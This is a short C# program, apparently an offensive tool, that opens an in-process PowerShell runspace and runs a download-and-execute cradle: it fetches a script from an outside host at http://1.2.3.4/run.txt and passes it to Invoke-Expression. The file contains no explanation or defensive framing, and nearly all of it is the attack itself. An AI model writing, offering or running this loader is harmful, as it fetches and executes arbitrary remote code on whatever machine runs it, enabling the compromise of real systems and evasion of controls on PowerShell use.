using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace PowerShellRunspace
{
    class Program
    {
        static void Main(string[] args)
        {

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/run.txt') | IEX";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
